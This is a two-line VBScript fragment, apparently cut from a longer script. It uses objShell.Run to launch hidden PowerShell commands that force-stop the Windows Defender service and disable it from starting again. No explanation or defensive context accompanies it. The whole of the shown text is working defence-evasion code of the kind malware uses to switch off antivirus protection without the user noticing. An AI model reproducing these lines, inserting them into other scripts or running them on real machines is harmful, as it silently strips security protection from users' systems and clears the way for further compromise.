...
objShell.Run "powershell.exe -Command Stop-Service -Name 'WinDefend' -Force", 0, True
objShell.Run "powershell.exe -Command Set-Service -Name 'WinDefend' -StartupType Disabled", 0, True
